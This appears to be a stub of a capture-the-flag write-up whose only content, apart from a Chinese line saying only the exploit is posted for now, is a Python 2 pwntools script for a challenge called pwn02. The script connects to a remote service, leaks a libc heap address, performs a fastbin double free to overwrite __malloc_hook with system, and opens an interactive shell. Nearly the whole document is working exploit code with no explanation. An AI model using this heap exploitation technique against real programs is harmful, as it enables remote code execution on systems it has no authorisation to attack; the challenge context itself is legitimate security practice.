占位

暂时只放exp

```python
#!/usr/bin/python2
#coding: utf8
from pwn import *
from time import sleep
import sys

mode = "release" if len(sys.argv) <= 1 else sys.argv[1]
system = 0x400856

print "%s mode" % mode
if mode == "debug":
    session = process("../pwn02")
else:
    session = remote("39.100.87.24", "8102")
    libc_start_main = 0x7ffff7a2d830 - 0xf0 #/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d830]
    #one_gadget = libc_start_main + (0xf1147-0x20740)
    #system = libc_start_main + (0x45390-0x20740)

def alloc(index, size, content):
    session.sendline("%d %d" %(1,index))
    if mode != "debug": sleep(0.5)
    session.sendline("%d"%size)
    if mode != "debug": sleep(0.5)
    session.sendline(content)
    if mode != "debug": sleep(0.5)
    #print session.recv()

def free(index):
    session.sendline("2 %d" % index)
    if mode != "debug": sleep(0.5)
    #print session.recv()

def puts(index):
    session.sendline("3 %d" % index)
    if mode != "debug": sleep(0.5)
    #session.recv()


#leak main_arena+88:
alloc(1, 200, 'AAA')
alloc(2, 200, 'BBB')
free(1)
session.recv()
puts(1)
retn = session.recv(6)
with open("fuck",'wb') as f:
    f.write(retn)


main_arena88 = u64("%s\x00\x00" % retn)
malloc_hook = main_arena88 - 88 - 0x10
free_hook = malloc_hook + 0x1c98
fake_chunk = malloc_hook -16 -3

if mode=="debug":
    libc_start_main = main_arena88 - 0x3A4438
    #one_gadget = libc_start_main + (0x45390-0x20740)
    #cmd = libc_start_main - (0x20740 - 0x18CD57)
    #system = libc_start_main + (0x45390-0x20740)


print "main_arena+88: 0x%x" % main_arena88
print "libc_start_main: 0x%x" % libc_start_main
#print "one_gadget: 0x%x" % one_gadget
print "system: 0x%x" % system
print "fake_chunk_size_pos: 0x%x" % (fake_chunk)
#print "cmd: 0x%x" % cmd
#fastbin attack:
alloc(3,0x60, 'AAAA')
alloc(4,0x60, '/bin/sh')

free(3)
free(4)
free(3)


#pause = raw_input("waiting...")
if mode=="debug": 
    gdb.attach(session, "b system")
    pause = raw_input("waiting...")

sleep(5)
print session.recv()

puts(3) # the fd->4th chunk
sleep(3)
cmd = session.recvuntil("\n")
with open("fuck", 'wb') as f:
	f.write(cmd)
cmd = cmd[cmd.rfind(" ")+1:cmd.rfind("\x00")]
print cmd
print len(cmd)
with open("shit", 'wb') as shit:
	shit.write(cmd)


cmd = u64(cmd + "\x00"*(8-len(cmd)))
cmd += 0x10 #fd
print "cmd: 0x%x" % cmd

alloc(5, 0x60, p64(fake_chunk))# 3th
alloc(6, 0x60, 'sh') #4th
alloc(7, 0x60, p64(fake_chunk))# 3th

puts(6)
print session.recv()

alloc(8, 0x60, "A"*(3) + p64(system))



alloc(1, cmd, 'shell')
session.interactive()
session.close()

```

